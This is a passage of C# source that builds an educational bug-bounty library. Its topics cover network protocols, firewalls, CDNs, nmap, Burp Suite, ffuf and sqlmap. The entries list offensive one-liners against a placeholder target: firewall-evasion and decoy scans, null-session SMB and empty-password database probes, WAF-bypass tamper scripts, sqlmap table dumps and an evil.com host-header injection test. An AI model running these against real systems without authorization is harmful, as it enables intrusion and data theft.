                    new StepItem { Number = 1, Description = "Map each tool to its OSI layer", Code = "ping=L3, nmap=L4, burp=L7, sslyze=L6" },
                    new StepItem { Number = 2, Description = "Use Wireshark to see packets at each layer", Code = "Apply filters: tcp, udp, http, dns, tls" },
                    new StepItem { Number = 3, Description = "Test Layer 4 - scan all ports", Code = "nmap -p- target.com" },
                    new StepItem { Number = 4, Description = "Test Layer 6 - analyze SSL/TLS", Code = "sslyze target.com" },
                    new StepItem { Number = 5, Description = "Test Layer 7 - web application testing", Code = "Use Burp Suite" }
                },
                Tools = new List<string> { "Wireshark", "nmap", "ping", "traceroute", "sslyze", "curl", "arp" }
            };

            libraryTopics["Net_Protocols"] = new LibraryTopic
            {
                Tag = "Net_Protocols",
                Category = "Networking",
                Title = "Network Protocols Encyclopedia",
                Subtitle = "Comprehensive Guide to Network Protocols",
                Content = "Network protocols are standardized rules for communication between systems. Bug hunters encounter many different protocols during reconnaissance and testing. Understanding them helps identify vulnerabilities and misconfigurations.\n\nHTTP/HTTPS: Web traffic. Ports 80/443. Most web vulnerabilities are here.\nFTP: File Transfer Protocol. Ports 20/21. Often misconfigured with anonymous access or weak credentials.\nSSH: Secure Shell. Port 22. Remote access. Test for weak credentials and outdated versions.\nTelnet: Unencrypted remote access. Port 23. Outdated but still found. Clear-text credentials.\nSMTP: Email sending. Port 25, 465, 587. Email security issues, open relays.\nPOP3: Email retrieval. Port 110, 995. Old protocol.\nIMAP: Email access. Port 143, 993. Common in enterprise.\nDNS: Domain resolution. Port 53. Zone transfer, cache poisoning.\nDHCP: Dynamic IP assignment. Ports 67/68. DHCP starvation, rogue servers.\nSNMP: Network management. Port 161/162. Often configured with default community strings.\nRDP: Remote Desktop. Port 3389. BlueKeep, weak credentials.\nSMB: File sharing. Port 445. EternalBlue, weak credentials.\nMSQL: MySQL. Port 3306. SQL injection, weak credentials.\nPostgres: Port 5432. Similar issues.\nRedis: Port 6379. Unauthenticated access common.\nMongoDB: Port 27017. Often exposed without authentication.\nElasticsearch: Port 9200. Exposed indexes with sensitive data.\nKibana: Port 5601. Often exposed without authentication.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "nmap -sV -p 21,22,23,25,53,80,443,445,3306,3389,5432 target.com", Explanation = "Scan common service ports and detect versions." },
                    new CommandItem { Text = "nc target.com 21", Explanation = "Connect to FTP and see banner. Check for anonymous login." },
                    new CommandItem { Text = "nc target.com 22", Explanation = "Connect to SSH and see version banner." },
                    new CommandItem { Text = "snmp-check target.com -c public", Explanation = "SNMP enumeration with default 'public' community string." },
                    new CommandItem { Text = "enum4linux target.com", Explanation = "SMB enumeration for Windows shares, users, and policies." },
                    new CommandItem { Text = "mysql -h target.com -u root -p", Explanation = "Attempt MySQL connection. Test for empty password." },
                    new CommandItem { Text = "redis-cli -h target.com", Explanation = "Connect to Redis. Test if authentication is required." },
                    new CommandItem { Text = "curl http://target.com:9200/_cat/indices", Explanation = "Check exposed Elasticsearch indices." },
                    new CommandItem { Text = "curl http://target.com:27017", Explanation = "Check if MongoDB is exposed on default port." },
                    new CommandItem { Text = "smbclient -L //target.com -N", Explanation = "List SMB shares without authentication (-N for null session)." }
                },
                Tools = new List<string> { "nmap", "netcat", "snmp-check", "enum4linux", "smbclient", "redis-cli", "mysql", "curl" }
            };

            libraryTopics["Net_Firewall"] = new LibraryTopic
            {
                Tag = "Net_Firewall",
                Category = "Networking",
                Title = "Firewalls and How They Work",
                Subtitle = "Understanding Firewall Technology for Penetration Testing",
                Content = "Firewalls are network security devices that monitor and control incoming and outgoing network traffic based on configured rules. Understanding firewalls helps you interpret scan results, evade detection, and find misconfigurations.\n\nTypes of Firewalls:\nPacket Filtering: Examines packet headers (IP, port, protocol). Simple but limited.\nStateful Inspection: Tracks connection state. More sophisticated.\nApplication Layer (WAF): Understands application protocols. Inspects payload content.\nNext-Generation (NGFW): Combines traditional firewall with IPS, application awareness.\nWeb Application Firewall (WAF): Specifically designed for HTTP/HTTPS traffic protection.\n\nFirewall Detection in Nmap: When a port shows as 'filtered' in nmap, a firewall is blocking probe packets. Different scan techniques may bypass certain firewall configurations.\n\nWAF Detection: WAFs intercept HTTP traffic. Signs of a WAF: unusual error pages when sending malicious payloads, specific headers in responses, IP blocks when scanning.\n\nWAF Bypass Techniques: Different encoding, case variation, comment insertion, whitespace manipulation, and alternative representations can sometimes bypass WAF rules.\n\nCommon WAF Bypass Vectors for XSS: Using JavaScript event handlers not in WAF rules, encoding payloads in different formats, using template literals, etc.\n\nCloudflare, AWS WAF, Akamai, and ModSecurity are common WAFs you'll encounter.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "nmap -sA target.com", Explanation = "ACK scan to detect firewall rules. Shows filtered vs unfiltered ports." },
                    new CommandItem { Text = "nmap -sF target.com", Explanation = "FIN scan to potentially bypass basic packet filters." },
                    new CommandItem { Text = "nmap -sX target.com", Explanation = "Xmas scan with multiple flags set. May bypass some firewalls." },
                    new CommandItem { Text = "nmap -f target.com", Explanation = "Fragment packets to try bypassing packet inspection." },
                    new CommandItem { Text = "wafw00f https://target.com", Explanation = "Detect and identify WAF protecting a website." },
                    new CommandItem { Text = "whatwaf -u https://target.com", Explanation = "Advanced WAF detection and bypass tool." },
                    new CommandItem { Text = "nmap --mtu 24 target.com", Explanation = "Set custom MTU for fragmented packets." },
                    new CommandItem { Text = "nmap -D RND:10 target.com", Explanation = "Decoy scan using 10 random IPs to obscure true source." }
                },
                Tools = new List<string> { "nmap", "wafw00f", "whatwaf", "hping3", "Burp Suite" }
            };

            libraryTopics["Net_Load"] = new LibraryTopic
            {
                Tag = "Net_Load",
                Category = "Networking",
                Title = "Load Balancers Explained",
                Subtitle = "Understanding Load Balancing for Security Testing",
                Content = "Load balancers distribute incoming network traffic across multiple backend servers. Understanding load balancers is important for bug hunters because they affect how your tests reach backend systems and can reveal infrastructure information.\n\nTypes of Load Balancing:\nRound Robin: Distributes requests sequentially to each server.\nLeast Connections: Sends to server with fewest active connections.\nIP Hash: Routes based on client IP, ensuring consistent server assignment.\nLayer 4 (Transport): Works at TCP/UDP level, fast but less intelligent.\nLayer 7 (Application): Works at HTTP level, can make routing decisions based on content.\n\nLoad Balancer Detection: LB headers like X-Served-By or Via may reveal backend servers. Cookies like SERVERID or JSESSIONID can indicate which backend served the request. Response time variation may reveal multiple backends.\n\nSecurity Implications: Load balancers may have different WAF configurations than backends. Some backends may be reachable directly. Load balancer admin interfaces may be exposed. Session persistence issues can cause authentication bugs.\n\nCloud Load Balancers: AWS Elastic Load Balancer, Google Cloud Load Balancing, Azure Load Balancer all have configuration options that can lead to misconfigurations.\n\nIP Range Discovery: Companies using load balancers may have multiple IP ranges. Discovering all IP addresses in scope requires mapping the full infrastructure.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "curl -I https://target.com | grep -i 'x-served-by\\|x-backend\\|via\\|server'", Explanation = "Check for headers that reveal load balancer or backend server information." },
                    new CommandItem { Text = "for i in $(seq 10); do curl -I https://target.com | grep -i server; done", Explanation = "Make multiple requests and compare server headers. Different backends may respond." },
                    new CommandItem { Text = "dig target.com A", Explanation = "DNS lookup may return multiple IPs for load-balanced services." },
                    new CommandItem { Text = "nmap -p 80,443 -O target.com", Explanation = "OS detection may reveal different backend systems if rotating." },
                    new CommandItem { Text = "lbd target.com", Explanation = "Load balancing detector tool. Detects DNS and HTTP load balancing." }
                },
                Tools = new List<string> { "curl", "lbd", "nmap", "dig", "Burp Suite" }
            };

            libraryTopics["Net_CDN"] = new LibraryTopic
            {
                Tag = "Net_CDN",
                Category = "Networking",
                Title = "CDN and Caching Mechanisms",
                Subtitle = "Understanding Content Delivery Networks for Bug Hunters",
                Content = "Content Delivery Networks (CDNs) distribute content across multiple geographic locations to improve performance and availability. Understanding CDNs is important for bug bounty hunters because they affect target IP ranges, can hide origin servers, and introduce their own security considerations.\n\nHow CDNs Work: When a user requests content, the CDN routes the request to the nearest 'edge node'. The edge serves cached content or forwards to the origin server. Cloudflare, Akamai, Fastly, and CloudFront are major CDNs.\n\nCDN Detection: CDN headers like CF-Ray (Cloudflare), X-Cache, Via, and X-Served-By reveal CDN presence. Reverse IP lookups showing CDN ranges confirm CDN usage.\n\nFinding Origin IPs Behind CDN: Historical DNS records may show the real IP before CDN was added. SSL certificates may reveal the origin domain. Security headers or server banners may differ between CDN and origin. HTTP headers like X-Forwarded-For may reveal origin. Shodan and Censys may index the origin server directly.\n\nCDN Security Issues: CDN misconfigurations can expose origin servers, cache sensitive pages, or serve stale content to wrong users. Cache poisoning attacks manipulate what CDNs cache.\n\nCache Headers: Cache-Control, Expires, ETag, Last-Modified, and Vary headers control caching behavior. Understanding these helps identify caching issues.\n\nCache Poisoning: If an attacker can influence what gets cached (via headers, parameters, or cookies), they can poison the cache and serve malicious content to other users. This is a high-value bug.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "curl -I https://target.com | grep -i 'cf-ray\\|x-cache\\|cdn\\|cloudflare'", Explanation = "Check response headers for CDN indicators." },
                    new CommandItem { Text = "dig target.com", Explanation = "CDN IPs often resolve to CDN ranges, not origin server." },
                    new CommandItem { Text = "nslookup target.com 1.1.1.1 && nslookup target.com 8.8.8.8", Explanation = "Compare DNS results from different resolvers. CDNs may return different IPs." },
                    new CommandItem { Text = "curl -H 'Host: target.com' http://ORIGIN_IP/", Explanation = "If you find the origin IP, connect directly bypassing CDN." },
                    new CommandItem { Text = "curl -I https://target.com?test=1 && curl -I https://target.com?test=2", Explanation = "Test if parameters affect caching. Different responses indicate caching issues." },
                    new CommandItem { Text = "curl -H 'X-Forwarded-Host: evil.com' https://target.com", Explanation = "Test host header injection through CDN. May affect caching." }
                },
                Tools = new List<string> { "curl", "dig", "nslookup", "Shodan", "Censys", "SecurityTrails", "Burp Suite" }
            };

            libraryTopics["Net_IPv6"] = new LibraryTopic
            {
                Tag = "Net_IPv6",
                Category = "Networking",
                Title = "IPv4 vs IPv6 Deep Dive",
                Subtitle = "Understanding Modern IP Addressing",
                Content = "IPv6 is the next generation of Internet Protocol, designed to replace IPv4 and solve address exhaustion. While IPv4 remains dominant, IPv6 adoption is growing, and bug hunters increasingly encounter IPv6 in the wild.\n\nIPv6 Address Format: IPv6 addresses are 128 bits, written as 8 groups of 4 hexadecimal digits: 2001:0db8:85a3:0000:0000:8a2e:0370:7334. Leading zeros in groups can be omitted: 2001:db8:85a3::8a2e:370:7334.\n\nIPv6 Address Types:\nGlobal Unicast (2000::/3): Globally routable, equivalent to IPv4 public addresses.\nLink-Local (fe80::/10): Only valid on local network segment.\nLoopback (::1): Equivalent to 127.0.0.1.\nMulticast (ff00::/8): One-to-many communication.\nUnique Local (fc00::/7): Private addresses, equivalent to RFC 1918.\n\nIPv6 Security Considerations: Many systems support both IPv4 and IPv6 (dual-stack). Security controls may be properly configured for IPv4 but not IPv6. Services accessible only via IPv6 may bypass IPv4-only firewalls. IPv6 scanning requires different tools and approaches.\n\nDNS with IPv6: AAAA records contain IPv6 addresses. Querying for AAAA records may reveal additional infrastructure.\n\nIPv6 Reconnaissance: Traditional recon tools need IPv6 support. Nmap scans IPv6 with -6 flag. The address space is too large for brute force scanning, requiring different approaches.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "nmap -6 target.com", Explanation = "Scan IPv6 address of target. Requires -6 flag for IPv6 scanning." },
                    new CommandItem { Text = "dig target.com AAAA", Explanation = "Get IPv6 address (AAAA record) for domain." },
                    new CommandItem { Text = "ping6 ::1", Explanation = "Ping IPv6 loopback address to test IPv6 support." },
                    new CommandItem { Text = "ip -6 addr show", Explanation = "Show IPv6 addresses on all network interfaces." },
                    new CommandItem { Text = "curl -6 https://target.com", Explanation = "Force curl to use IPv6 connection." },
                    new CommandItem { Text = "nmap -6 -sV fe80::1%eth0", Explanation = "Scan link-local IPv6 address on specific interface." }
                },
                Tools = new List<string> { "nmap", "dig", "ping6", "curl", "ip", "traceroute6" }
            };

            libraryTopics["Net_MAC"] = new LibraryTopic
            {
                Tag = "Net_MAC",
                Category = "Networking",
                Title = "MAC Addresses and ARP",
                Subtitle = "Understanding Layer 2 Networking",
                Content = "MAC (Media Access Control) addresses are unique hardware identifiers assigned to network interface cards. ARP (Address Resolution Protocol) maps IP addresses to MAC addresses on local networks. While less directly relevant to web bug bounty, understanding these concepts helps with network fundamentals.\n\nMAC Address Format: 48-bit address written as six pairs of hexadecimal digits: 00:1A:2B:3C:4D:5E. First three octets identify the manufacturer (OUI - Organizationally Unique Identifier). Last three octets are device-specific.\n\nARP Protocol: When a device needs to send data to an IP on the local network, it broadcasts an ARP request asking 'Who has this IP? Tell me your MAC address.' The device with that IP responds with its MAC. This mapping is cached in the ARP table.\n\nARP Poisoning: An attacker sends fake ARP responses claiming to have the MAC for a different IP (like the default gateway). Other devices update their ARP cache with the fake mapping, sending traffic through the attacker. This enables man-in-the-middle attacks.\n\nARP in Bug Bounty: Mostly relevant for network-level testing, internal network assessments, and understanding how network attacks work. Not typically tested in web bug bounty programs.\n\nOUI Lookup: The first three octets of a MAC address identify the manufacturer. Useful in network assessments to identify device types.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "arp -n", Explanation = "Show ARP cache table with MAC and IP mappings." },
                    new CommandItem { Text = "ip neigh show", Explanation = "Modern replacement for arp -n. Shows neighbor table." },
                    new CommandItem { Text = "arp-scan -l", Explanation = "Scan local network for all hosts via ARP. Install: apt install arp-scan." },
                    new CommandItem { Text = "arping -I eth0 192.168.1.1", Explanation = "Send ARP ping to specific host on local network." },
                    new CommandItem { Text = "ip link show", Explanation = "Show MAC address of local network interfaces." },
                    new CommandItem { Text = "ifconfig eth0 | grep ether", Explanation = "Show MAC address of eth0 interface with ifconfig." }
                },
                Tools = new List<string> { "arp", "arp-scan", "arping", "Wireshark", "ip" }
            };

            libraryTopics["Net_Routing"] = new LibraryTopic
            {
                Tag = "Net_Routing",
                Category = "Networking",
                Title = "Routing and Switching Basics",
                Subtitle = "Network Infrastructure Fundamentals",
                Content = "Routing and switching are fundamental networking concepts. Routers connect different networks and make decisions about where to send packets. Switches connect devices within the same network at the data link layer.\n\nRouting: Routers examine destination IP addresses and consult routing tables to determine the next hop. Static routes are manually configured. Dynamic routing uses protocols like OSPF, BGP, and RIP to automatically maintain routing tables.\n\nRouting Tables: Each device has a routing table showing which interface to use for each destination network. Default route (0.0.0.0/0) is the gateway of last resort when no more specific route matches.\n\nSwitching: Layer 2 switches forward frames based on MAC addresses. They learn which ports correspond to which MAC addresses by examining source addresses of incoming frames. VLAN (Virtual LAN) technology logically separates networks on the same physical switch.\n\nBug Bounty Relevance: Understanding routing helps interpret nmap results, understand traceroute output, and identify network topology. When testing APIs and internal applications, routing knowledge helps understand traffic flow.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "ip route show", Explanation = "Display current routing table." },
                    new CommandItem { Text = "route -n", Explanation = "Display routing table in numeric format (no hostname resolution)." },
                    new CommandItem { Text = "traceroute target.com", Explanation = "Trace packet path showing each router hop." },
                    new CommandItem { Text = "ip route add 10.10.10.0/24 via 192.168.1.1", Explanation = "Add static route. Useful when needing to reach specific subnets." },
                    new CommandItem { Text = "ip route get 8.8.8.8", Explanation = "Show which route would be used to reach specific IP." }
                },
                Tools = new List<string> { "traceroute", "ip", "route", "mtr" }
            };
        }

        
        private void InitializeTools()
        {
            libraryTopics["Tool_Nmap"] = new LibraryTopic
            {
                Tag = "Tool_Nmap",
                Category = "Essential Tools",
                Title = "Nmap - Complete Port Scanner Guide",
                Subtitle = "Mastering the Network Mapper",
                Content = "Nmap (Network Mapper) is the gold standard for network scanning and reconnaissance. It's an open-source tool for network discovery and security auditing. Nmap can discover hosts, services, operating systems, versions, and scripts.\n\nNmap Scan Types:\nTCP SYN (-sS): Default scan, stealthy, requires root\nTCP Connect (-sT): Full connection, doesn't require root\nUDP (-sU): Slower, finds UDP services\nPing (-sn): Host discovery, no port scan\nVersion (-sV): Service version detection\nOS (-O): Operating system detection\nScript (-sC): Run default NSE scripts\n\nNmap Scripting Engine (NSE): NSE allows you to write and run scripts against targets. Scripts are categorized: auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, vuln.\n\nOutput Formats: Normal (-oN), XML (-oX), Grepable (-oG), All (-oA). Always save your scan results.\n\nTiming Templates: T0 (paranoid), T1 (sneaky), T2 (polite), T3 (normal, default), T4 (aggressive), T5 (insane). T4 is recommended for most bug bounty work.\n\nNmap in Bug Bounty: Use nmap to discover open ports and services. Combine with version detection to identify potentially vulnerable software. Use NSE scripts to check for common vulnerabilities.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "nmap -sV -sC -p- -T4 target.com", Explanation = "Comprehensive scan: version detection, default scripts, all ports, aggressive timing." },
                    new CommandItem { Text = "nmap -sn 192.168.1.0/24", Explanation = "Ping sweep to discover live hosts without port scanning." },
                    new CommandItem { Text = "nmap -p 80,443,8080,8443 -T4 target.com", Explanation = "Quick scan of common web ports." },
                    new CommandItem { Text = "nmap --top-ports 1000 -T4 target.com", Explanation = "Scan the 1000 most common ports. Fast and practical." },
                    new CommandItem { Text = "nmap -sU --top-ports 100 target.com", Explanation = "Scan top 100 UDP ports. Finds DNS, SNMP, TFTP, etc." },
                    new CommandItem { Text = "nmap -O target.com", Explanation = "OS detection. Identify operating system and version." },
                    new CommandItem { Text = "nmap -A target.com", Explanation = "Aggressive scan: OS detection, version, scripts, traceroute. Comprehensive but noisy." },
                    new CommandItem { Text = "nmap -sV --script=http-headers target.com", Explanation = "Get HTTP headers using NSE script." },
                    new CommandItem { Text = "nmap --script=vuln target.com", Explanation = "Run all vulnerability detection scripts. Good for quick vuln check." },
                    new CommandItem { Text = "nmap -sV --script=http-robots.txt target.com", Explanation = "Get robots.txt content using NSE script." },
                    new CommandItem { Text = "nmap -oX output.xml -oN output.txt target.com", Explanation = "Save output in XML and normal formats simultaneously." },
                    new CommandItem { Text = "nmap -iL targets.txt -T4 -sV", Explanation = "Scan multiple targets from file. One target per line." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Quick initial scan to find open ports", Code = "nmap --top-ports 1000 target.com" },
                    new StepItem { Number = 2, Description = "Deep scan with version detection on open ports", Code = "nmap -sV -p 22,80,443 target.com" },
                    new StepItem { Number = 3, Description = "Run relevant NSE scripts based on findings", Code = "nmap --script=http-headers,http-methods target.com" },
                    new StepItem { Number = 4, Description = "Save all results to files", Code = "nmap -oA results target.com" },
                    new StepItem { Number = 5, Description = "Parse and analyze results", Code = "grep 'open' results.nmap" }
                },
                Tools = new List<string> { "nmap", "masscan", "rustscan", "unicornscan" },
                Resources = new List<string>
                {
                    "https://nmap.org/book/",
                    "https://nmap.org/nsedoc/",
                    "https://highon.coffee/blog/nmap-cheat-sheet/"
                }
            };

            libraryTopics["Tool_Burp"] = new LibraryTopic
            {
                Tag = "Tool_Burp",
                Category = "Essential Tools",
                Title = "Burp Suite - Full Tutorial",
                Subtitle = "Complete Guide to Using Burp Suite for Web Testing",
                Content = "Burp Suite is the most widely used tool for web application security testing. It functions as an intercepting proxy between your browser and target servers, allowing you to inspect, modify, and replay HTTP requests and responses.\n\nBurp Suite Components:\nProxy: Intercepts browser-server traffic. The core of Burp Suite.\nTarget: Organizes and maps discovered content.\nRepeat: Replay and modify individual requests.\nIntruder: Automated attacks with payload positions.\nScanner (Pro): Automated vulnerability scanning.\nDecoder: Encode/decode various formats.\nComparer: Compare responses to spot differences.\nExtender: Extend functionality with BApps.\n\nProxy Setup: Configure browser to use 127.0.0.1:8080 as proxy. Install Burp's CA certificate for HTTPS interception.\n\nIntercepting Traffic: Turn intercept on to pause and modify requests in transit. Turn off to let requests flow through while still capturing.\n\nRepeater Usage: Send any request from proxy history to Repeater for manual testing. Modify parameters, headers, or body and resend to see how the application responds.\n\nIntruder Attacks: Sniper (single position, multiple payloads), Battering Ram (same payload in all positions), Pitchfork (synchronized payloads), Cluster Bomb (all combinations).\n\nBurp Extensions: Essential extensions include Autorize, Logger++, Param Miner, JWT Editor, SQLiPy, Upload Scanner.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "burpsuite &", Explanation = "Launch Burp Suite in background from terminal." },
                    new CommandItem { Text = "java -jar burpsuite.jar", Explanation = "Launch Burp Suite using Java directly. Useful when not in PATH." },
                    new CommandItem { Text = "curl -x http://127.0.0.1:8080 https://target.com", Explanation = "Route curl through Burp Suite proxy for capturing." },
                    new CommandItem { Text = "python3 -c \"import requests; requests.get('https://target.com', proxies={'https': 'http://127.0.0.1:8080'}, verify=False)\"", Explanation = "Route Python requests through Burp for interception." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Launch Burp Suite and start project", Code = "Open Burp, select 'Temporary project', use default settings" },
                    new StepItem { Number = 2, Description = "Configure browser proxy to 127.0.0.1:8080", Code = "FoxyProxy: Add pattern, set proxy to 127.0.0.1:8080" },
                    new StepItem { Number = 3, Description = "Install Burp CA certificate for HTTPS", Code = "Navigate to http://burp, download CA, import to browser" },
                    new StepItem { Number = 4, Description = "Browse target and capture traffic", Code = "Turn off intercept, browse normally, check Proxy > HTTP History" },
                    new StepItem { Number = 5, Description = "Test interesting requests in Repeater", Code = "Right-click request > Send to Repeater > Modify and send" },
                    new StepItem { Number = 6, Description = "Install essential extensions", Code = "Extender > BApp Store > Install Autorize, Param Miner, JWT Editor" },
                    new StepItem { Number = 7, Description = "Map attack surface in Target tab", Code = "View sitemap, right-click to scan or send to tools" }
                },
                Tools = new List<string> { "Burp Suite", "Burp Suite Professional", "OWASP ZAP" },
                Resources = new List<string>
                {
                    "https://portswigger.net/burp/documentation",
                    "https://portswigger.net/web-security",
                    "https://github.com/snoopysecurity/awesome-burp-extensions"
                }
            };

            libraryTopics["Tool_FFUF"] = new LibraryTopic
            {
                Tag = "Tool_FFUF",
                Category = "Essential Tools",
                Title = "Gobuster and FFUF Mastery",
                Subtitle = "Web Directory and Parameter Fuzzing",
                Content = "Gobuster and FFUF are essential tools for discovering hidden content on web servers. They work by rapidly sending requests with different values from a wordlist and identifying valid responses based on status codes or response size.\n\nGobuster: Written in Go, Gobuster excels at directory/file brute forcing (dir mode), DNS subdomain enumeration (dns mode), and virtual host discovery (vhost mode).\n\nFFUF (Fuzz Faster U Fool): More flexible than Gobuster, FFUF supports fuzzing any part of a request using the FUZZ keyword. It can fuzz URLs, headers, POST data, and more. FFUF also has more filtering options.\n\nWordlists: The quality of your wordlists directly impacts results. SecLists is the standard collection. Common wordlists: common.txt (basic), raft-medium-words.txt (better coverage), directory-list-2.3-medium.txt (comprehensive), api-endpoints.txt (for APIs).\n\nFuzzing Strategy: Start with common wordlists for speed, then use larger ones if initial results are promising. Filter responses by status code or size to remove false positives.\n\nParameter Discovery: FFUF can discover hidden parameters by fuzzing parameter names. This often reveals functionality not linked in the UI.\n\nVirtual Host Fuzzing: Discover virtual hosts on a server by fuzzing the Host header. Many servers host multiple sites on the same IP with different hostnames.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt", Explanation = "Basic directory enumeration with common wordlist." },
                    new CommandItem { Text = "gobuster dir -u https://target.com -w wordlist.txt -x php,html,js,txt -t 50", Explanation = "Directory scan with file extensions. -t sets threads." },
                    new CommandItem { Text = "gobuster dns -d target.com -w subdomains.txt -t 50", Explanation = "Subdomain enumeration using DNS mode." },
                    new CommandItem { Text = "gobuster vhost -u https://target.com -w vhosts.txt", Explanation = "Virtual host discovery by fuzzing Host header." },
                    new CommandItem { Text = "ffuf -u https://target.com/FUZZ -w wordlist.txt", Explanation = "Basic FFUF fuzzing. FUZZ keyword marks the fuzzing position." },
                    new CommandItem { Text = "ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302 -fc 404", Explanation = "Filter by status codes. -mc to include, -fc to exclude." },
                    new CommandItem { Text = "ffuf -u https://target.com/FUZZ -w wordlist.txt -fs 1234", Explanation = "Filter by response size. -fs excludes responses of specified size." },
                    new CommandItem { Text = "ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt -H 'Authorization: Bearer TOKEN'", Explanation = "API endpoint fuzzing with authentication header." },
                    new CommandItem { Text = "ffuf -u https://target.com/?FUZZ=test -w params.txt -fw 10", Explanation = "Parameter name fuzzing. -fw filters by word count." },
                    new CommandItem { Text = "ffuf -u https://target.com/page -X POST -d 'FUZZ=value' -w params.txt", Explanation = "POST parameter fuzzing." },
                    new CommandItem { Text = "ffuf -u https://target.com/ -H 'Host: FUZZ.target.com' -w subdomains.txt", Explanation = "Virtual host fuzzing via Host header." },
                    new CommandItem { Text = "ffuf -u https://FUZZ.target.com -w subdomains.txt -mc 200,301,302", Explanation = "Subdomain fuzzing with valid status code filtering." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Start with quick common wordlist scan", Code = "gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt" },
                    new StepItem { Number = 2, Description = "Add relevant file extensions", Code = "gobuster dir -u https://target.com -w wordlist.txt -x php,js,html,bak" },
                    new StepItem { Number = 3, Description = "Use larger wordlists on promising targets", Code = "ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" },
                    new StepItem { Number = 4, Description = "Fuzz discovered directories recursively", Code = "gobuster dir -u https://target.com/admin -w wordlist.txt" },
                    new StepItem { Number = 5, Description = "Fuzz for parameters on interesting pages", Code = "ffuf -u https://target.com/page?FUZZ=test -w params.txt" }
                },
                Tools = new List<string> { "Gobuster", "FFUF", "Dirb", "Dirbuster", "Feroxbuster", "SecLists" },
                Resources = new List<string>
                {
                    "https://github.com/OJ/gobuster",
                    "https://github.com/ffuf/ffuf",
                    "https://github.com/danielmiessler/SecLists"
                }
            };

            libraryTopics["Tool_SQLMap"] = new LibraryTopic
            {
                Tag = "Tool_SQLMap",
                Category = "Essential Tools",
                Title = "SQLMap - Ultimate Guide",
                Subtitle = "Automated SQL Injection Testing",
                Content = "SQLMap is the most powerful automated SQL injection tool. It can detect and exploit SQL injection vulnerabilities, extract data from databases, access files on the server, and even execute operating system commands.\n\nSupported Databases: MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, HSQLDB.\n\nSQL Injection Types Supported: Boolean-based blind, Time-based blind, Error-based, UNION query-based, Stacked queries, and Out-of-band.\n\nUsage Ethics: Only use SQLMap on targets you have permission to test. SQLMap is powerful and can cause data corruption or service disruption if used incorrectly. Always use --flush-session and --fresh-queries to avoid issues.\n\nCapturing Requests: The best approach is to capture the request with Burp Suite, save it, and pass it to SQLMap with -r flag. This ensures all headers and cookies are properly included.\n\nWAF Bypass: SQLMap includes tamper scripts for bypassing WAFs. Common scripts: space2comment.py, charunicodeescape.py, randomcase.py, between.py.\n\nRate Limiting: Use --delay, --safe-freq, and --threads to control request rate and avoid detection or service disruption.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "sqlmap -u 'https://target.com/page?id=1' --dbs", Explanation = "Basic SQLmap test on URL parameter. --dbs lists databases." },
                    new CommandItem { Text = "sqlmap -r request.txt --dbs", Explanation = "Run SQLmap using saved Burp request file. Most reliable method." },
                    new CommandItem { Text = "sqlmap -u 'https://target.com/page?id=1' -D dbname --tables", Explanation = "List tables in specific database." },
                    new CommandItem { Text = "sqlmap -u 'https://target.com/page?id=1' -D dbname -T tablename --dump", Explanation = "Dump contents of specific table." },
                    new CommandItem { Text = "sqlmap -u 'https://target.com/page?id=1' --level=5 --risk=3", Explanation = "Increase detection level and risk. More thorough but more intrusive." },
                    new CommandItem { Text = "sqlmap -u 'https://target.com/page?id=1' --tamper=space2comment", Explanation = "Use tamper script to bypass WAF. space2comment replaces spaces with comments." },
                    new CommandItem { Text = "sqlmap -u 'https://target.com/page?id=1' --delay=2", Explanation = "Add 2 second delay between requests to avoid rate limiting." },
                    new CommandItem { Text = "sqlmap -r request.txt --batch --dbs", Explanation = "Non-interactive mode with --batch. Automatically accepts defaults." },
                    new CommandItem { Text = "sqlmap -u 'https://target.com/page?id=1' --technique=B --dbms=mysql", Explanation = "Specify injection technique (B=Boolean) and database type." },
                    new CommandItem { Text = "sqlmap -u 'https://target.com/page?id=1' --cookie='session=abc123'", Explanation = "Include cookies for authenticated testing." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Capture the request with Burp Suite", Code = "Right-click > Save request to file" },
                    new StepItem { Number = 2, Description = "Run initial detection", Code = "sqlmap -r request.txt" },
                    new StepItem { Number = 3, Description = "List available databases", Code = "sqlmap -r request.txt --dbs" },
                    new StepItem { Number = 4, Description = "Explore the target database", Code = "sqlmap -r request.txt -D target_db --tables" },
                    new StepItem { Number = 5, Description = "Extract relevant data", Code = "sqlmap -r request.txt -D target_db -T users --dump" },
                    new StepItem { Number = 6, Description = "Document findings for report", Code = "Save all output to file with --output-dir flag" }
                },
                Tools = new List<string> { "SQLMap", "Burp Suite", "Havij", "SQLNinja" },
                Resources = new List<string>
                {
                    "https://github.com/sqlmapproject/sqlmap/wiki/Usage",
                    "https://sqlmap.org/",
                    "https://portswigger.net/web-security/sql-injection"
                }
            };

            libraryTopics["Tool_Nikto"] = new LibraryTopic
            {
                Tag = "Tool_Nikto",
                Category = "Essential Tools",
                Title = "Nikto Web Scanner Deep Dive",
                Subtitle = "Comprehensive Web Server Vulnerability Scanner",
